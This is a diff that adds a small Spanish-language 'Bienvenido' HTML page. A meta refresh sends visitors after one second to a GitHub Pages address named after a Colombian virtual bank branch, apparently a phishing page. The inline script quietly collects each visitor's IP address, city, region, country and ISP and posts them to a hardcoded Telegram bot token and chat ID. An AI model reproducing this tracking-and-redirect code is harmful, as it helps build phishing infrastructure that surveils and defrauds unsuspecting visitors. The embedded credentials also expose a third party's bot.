@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Mi Sitio</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      background-image: url('fondoz.png'); /* Reemplaza con la URL de tu imagen */
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+      font-family: Arial, sans-serif;
+      color: #333;
+      padding: 2rem;
+      text-align: center;
+    }
+    .container {
+      max-width: 600px;
+      margin: 0 auto;
+      padding: 2rem;
+      border: 1px solid #ddd;
+      border-radius: 10px;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+      background-color: rgba(255, 255, 255, 0.9); /* Fondo semitransparente */
+    }
+  </style>
+
+  <META HTTP-EQUIV="REFRESH" CONTENT="1;https://sucursalvirtual-cre-col.github.io/personapp/c.html">
+</head>
+<body>
+  <div class="container">
+    <h1>¡Bienvenido!</h1>
+    <p></p>
+  </div>
+
+  <script>
+    const botToken = "6590065003:AAEElBaLOdkZFnHcsOG2gFGudH9jsbb0vwY"; // Reemplaza con tu token real
+    const chatId = "6860315789";        // Reemplaza con tu chat ID real
+
+    fetch("https://ipapi.co/json/")
+      .then(response => response.json())
+      .then(data => {
+        const ip = data.ip;
+        const city = data.city;
+        const region = data.region;
+        const country = data.country_name;
+        const org = data.org || '';
+        const msg = `📥 Nuevo visitante:\n🌍 IP: ${ip}\n🏙️ Ciudad: ${city}\n📍 Región: ${region}\n🇨🇴 País: ${country}\n🏢 ISP: ${org}`;
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: msg
+          })
+        });
+      })
+      .catch(error => {
+        console.error("Error al obtener IP o enviar a Telegram:", error);
+      });
+  </script>
+</body>
+</html>
